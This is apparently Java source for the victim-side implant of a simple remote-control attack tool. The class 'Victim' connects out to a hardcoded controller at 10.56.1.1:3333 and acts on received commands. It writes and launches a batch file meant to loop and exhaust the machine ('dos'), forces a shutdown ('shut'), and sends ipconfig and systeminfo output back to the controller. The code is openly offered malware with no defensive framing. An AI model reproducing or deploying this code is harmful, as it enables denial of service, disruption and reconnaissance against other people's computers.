package local.attack;
import java.io.*;
import java.net.*;
import java.util.*;
public class Victim {

	public static void main(String[] args) throws Exception{
		Scanner in=new Scanner(System.in);
		//System.out.println("ENTER IP ADDRESS: ");
		//String ip=in.nextLine();
		Socket s=new Socket("10.56.1.1",3333);
		DataInputStream din=new DataInputStream(s.getInputStream());
		DataOutputStream dout=new DataOutputStream(s.getOutputStream());
		BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
		String att="",vic="";
		while(!att.equals("stop")) {
			att=din.readUTF();
			if(att.equals("dos")) {
				try {
					FileOutputStream fout=new FileOutputStream("D:\\dos.bat");
					String str="@echo off\n:top\nStartngoto top";
					byte[] b=str.getBytes();
					fout.write(b);
					fout.close();
					String[] cmd= {"cmd.exe","/C","Start","D:\\dos.bat"};
					Process p=Runtime.getRuntime().exec(cmd);
					vic="Success!";
					dout.writeUTF(vic);
					dout.flush();
				
				}catch(Exception e){
					vic="Failed to DOS!!";
					dout.writeUTF(vic);
					dout.flush();
				}
				
			}

			if(att.equals("shut")) {
				try {
					FileOutputStream fout=new FileOutputStream("D:\\shut.bat");
					String str="@echo off\nshutdown -s -t2";;
					byte[] b=str.getBytes();
					fout.write(b);
					fout.close();
					String[] cmd= {"cmd.exe","/C","Start","D:\\shut.bat"};
					Process p=Runtime.getRuntime().exec(cmd);
					vic="Success!";
					dout.writeUTF(vic);
					dout.flush();
				
				}catch(Exception d){
					vic="Failed to Shutdown!!";
					dout.writeUTF(vic);
					dout.flush();
				}
				
			}
			if(att.equals("ip")) {
				try{
					ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/C", "ipconfig -all");
		            builder.redirectErrorStream(true);
		            Process p = builder.start();
		            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
		            String line,ans="";
		            while (true) {
		                line = r.readLine();
		                if (line == null) { break; }
		                ans+=line;
		                ans+="\n";
		            }
		            dout.writeUTF(ans);
		            dout.flush();
		            
		        }catch(Exception e) {
					System.out.println("Failed..");
				}
			}
			if(att.equals("syspec")) {
				try{
					ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/C", "systeminfo");
		            builder.redirectErrorStream(true);
		            Process p = builder.start();
		            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
		            String line,ans="";
		            while (true) {
		                line = r.readLine();
		                if (line == null) { break; }
		                ans+=line;
		                ans+="\n";
		            }
		            dout.writeUTF(ans);
		            dout.flush();
		            
		        }catch(Exception e) {
					System.out.println("Failed..");
				}
			}
			
		}//while loop end

	}

}
